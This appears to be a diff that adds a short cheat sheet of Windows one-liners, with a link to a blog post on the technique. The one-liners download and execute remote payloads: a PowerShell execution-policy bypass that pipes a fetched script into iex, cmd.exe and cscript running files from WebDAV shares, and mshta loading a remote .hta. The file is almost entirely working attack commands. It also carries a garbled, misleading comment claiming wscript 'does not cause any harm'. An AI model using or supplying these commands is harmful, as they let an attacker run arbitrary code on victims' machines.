@@ -1,0 +1,17 @@
+https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/
+
+#POWERSHELL 	
+powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
+
+#CMD.EXE
+cmd.exe /k < \\webdavserver\folder\batchfile.txt
+
+#WSCRIPT OR CSCRIPT
+# CSCRIPT = Windows Script Host
+# WSCRIPT = tasked with executing the VBScript files, and does not cause any harm to your PC.
+
+cscript //E:jscript \\webdavserver\folder\payload.txt
+
+#MSHTA Mshta.exe is a process which is a part of legitimate Microsoft HTML Application Hos
+
+mshta http://webserver/payload.hta
